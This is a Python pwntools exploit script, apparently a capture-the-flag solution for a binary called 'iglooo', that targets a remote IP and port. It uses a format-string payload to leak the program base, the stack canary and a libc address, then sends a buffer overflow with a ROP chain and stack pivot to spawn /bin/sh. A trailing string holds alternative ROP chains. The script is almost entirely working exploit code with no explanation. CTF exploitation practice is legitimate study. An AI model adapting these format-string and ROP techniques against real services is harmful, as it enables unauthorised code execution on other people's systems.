#!/usr/bin/python3
import sys
import time
from pwn import *
exe = ELF('iglooo', checksec=False)
context.binary = exe


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)
def sln(msg, num): return sla(msg, str(num).encode())
def sn(msg, num): return sa(msg, str(num).encode())


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        # brva 0x1404 
        # brva 0x1535
        # brva 0x1469
        b* 0x155555404345
        # brva 0x154B
        brva 0x13CB
        c
        ''')
        input()


if args.REMOTE:
    p = remote('34.72.43.223', 49251)
else:
    p = process(exe.path)
be = int(time.time())
sla(b">> ", b'1')
sla(b': ', "%25$p|%23$p|%17$p|%22$p|".ljust(0x3a, 'a'))
p.recvuntil(b'--> ')
# leak exe, canary
alarm = int(p.recvuntil(b'|', drop=True), 16)
if args.REMOTE:
    alarm += 0xac996
else:
    alarm += 0xabc76
exe.address = int(p.recvuntil(b'|', drop=True), 16) - exe.sym.main - 34
canary = int(p.recvuntil(b'|', drop=True), 16)
stack = int(p.recvuntil(b'|', drop=True), 16) - 0x90
info("alarm: " + hex(alarm))
info("libc.address: " + hex(exe.address))
info("libc.address: " + hex(canary))
info("libc.address: " + hex(stack))

# leak alarm
pop_rsi = 0x1223 + exe.address
pop_rbp = 0x0000000000001193 + exe.address
mov_rdi_rsi = 0x0000000000001218 + exe.address
ret = pop_rsi + 1
leave_ret = 0x0000000000001469 + exe.address

sla(b">> ", b'2')
GDB()

pa = b'a'*0x68 + flat(canary, exe.address + 0x4a00+0x70,
                      exe.address + 0x14FF,
                      )
sla(b': ', pa)
print(len(pa))

pa = flat(

    mov_rdi_rsi,
    exe.plt.puts,
    pop_rsi, exe.address + 0x4a00+0x40, mov_rdi_rsi,
    pop_rsi, 0,
    alarm+5,
    b'/bin/sh'.ljust(24, b'\0'),

)

pa = pa.ljust(0x68)
pa += flat(
    canary, exe.address + 0x4a00-8,
    pop_rsi, exe.address + 0x21A0+(67-0x3b+1),
    leave_ret,

)
print(len(pa))
sleep(3)
sl(pa)


p.interactive()


'''
0x5555555545c3
pa += flat(
    b'/bin/sh\0',
    pop_rsi, exe.address + 0x4800+8,
    mov_rdi_rsi,
    pop_rsi, 0,
    syscall
)


pa = p32(canary >> 8 & 0xffffffff)
pa += p16(canary >> 40 & 0xffff) + p8(canary >> 56 & 0xff)
# # pa += flat(0, exe.plt.alarm)
# # pa += flat(0,
# #     pop_rsi, exe.got.alarm,
# #     mov_rdi_rsi,
# #     exe.plt.puts,
# #     # exe.sym.main+1
# # )
pa += flat(
    b'/bin/sh\0',
    pop_rsi, exe.address + 0x4800-0x50,
    mov_rdi_rsi,
    pop_rbp, exe.address + 0x4800+8-0x50,

)
'''